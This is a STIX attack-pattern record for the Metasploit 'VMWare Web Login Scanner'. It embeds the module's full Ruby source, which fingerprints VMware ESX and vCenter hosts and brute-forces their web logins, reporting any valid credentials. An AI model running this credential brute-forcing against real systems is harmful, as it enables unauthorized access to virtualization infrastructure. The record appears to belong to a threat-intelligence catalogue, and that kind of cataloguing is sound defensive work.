{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--89e6c918-26f9-4b9f-b952-63fe45729535",
    "created": "2024-08-14T16:27:35.896006Z",
    "modified": "2024-08-14T16:27:35.896011Z",
    "name": "VMWare Web Login Scanner",
    "description": "This module attempts to authenticate to the VMWare HTTP service for VmWare Server, ESX, and ESXI'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/vmware/vmware_http_login.rb",
            "external_id": "vmware_http_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::VIMSoap\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'VMWare Web Login Scanner',\n      'Description'    => 'This module attempts to authenticate to the VMWare HTTP service\n        for VmWare Server, ESX, and ESXI',\n      'Author'         => ['theLightCosine'],\n      'References'     =>\n        [\n          [ 'CVE', '1999-0502'] # Weak password\n        ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => { 'SSL' => true }\n    )\n\n    register_options(\n      [\n        OptString.new('URI', [true, \"The default URI to login with\", \"/sdk\"]),\n        Opt::RPORT(443)\n      ])\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: 'vmware',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run_host(ip)\n    return unless is_vmware?\n    each_user_pass { |user, pass|\n      result = vim_do_login(user, pass)\n      case result\n      when :success\n        print_good \"#{rhost}:#{rport} - Successful Login! (#{user}:#{pass})\"\n        report_cred(ip: rhost, port: rport, user: user, password: pass, proof: result)\n        return if datastore['STOP_ON_SUCCESS']\n      when :fail\n        print_error \"#{rhost}:#{rport} - Login Failure (#{user}:#{pass})\"\n      end\n    }\n  end\n\n  # Mostly taken from the Apache Tomcat service validator\n  def is_vmware?\n    soap_data =\n      %Q|<env:Envelope xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:env=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n      <env:Body>\n      <RetrieveServiceContent xmlns=\"urn:vim25\">\n        <_this type=\"ServiceInstance\">ServiceInstance</_this>\n      </RetrieveServiceContent>\n      </env:Body>\n      </env:Envelope>|\n\n    res = send_request_cgi({\n      'uri'     => normalize_uri(datastore['URI']),\n      'method'  => 'POST',\n      'agent'   => 'VMware VI Client',\n      'data'    => soap_data\n    }, 25)\n\n    unless res\n      vprint_error(\"#{rhost}:#{rport} Error: no response\")\n      return false\n    end\n\n    fingerprint_vmware(res)\n  rescue ::Rex::ConnectionError => e\n    vprint_error(\"#{rhost}:#{rport} Error: could not connect\")\n    return false\n  rescue => e\n    vprint_error(\"#{rhost}:#{rport} Error: #{e}\")\n    return false\n  end\n\n  def fingerprint_vmware(res)\n    unless res\n      vprint_error(\"#{rhost}:#{rport} Error: no response\")\n      return false\n    end\n    return false unless res.body.include?('<vendor>VMware, Inc.</vendor>')\n\n    os_match = res.body.match(/<name>([\\w\\s]+)<\\/name>/)\n    ver_match = res.body.match(/<version>([\\w\\s\\.]+)<\\/version>/)\n    build_match = res.body.match(/<build>([\\w\\s\\.\\-]+)<\\/build>/)\n    full_match = res.body.match(/<fullName>([\\w\\s\\.\\-]+)<\\/fullName>/)\n\n    if full_match\n      print_good \"#{rhost}:#{rport} - Identified #{full_match[1]}\"\n      report_service(:host => rhost, :port => rport, :proto => 'tcp', :sname => 'https', :info => full_match[1])\n    end\n\n    unless os_match and ver_match and build_match\n      vprint_error(\"#{rhost}:#{rport} Error: Could not identify host as VMWare\")\n      return false\n    end\n\n    if os_match[1].include?('ESX') || os_match[1].include?('vCenter')\n      # Report a fingerprint match for OS identification\n      report_note(\n        :host  => rhost,\n        :ntype => 'fingerprint.match',\n        :data  => {'os.vendor' => 'VMware', 'os.product' => os_match[1] + \" \" + ver_match[1], 'os.version' => build_match[1] }\n      )\n      return true\n    end\n  end\nend\n"
}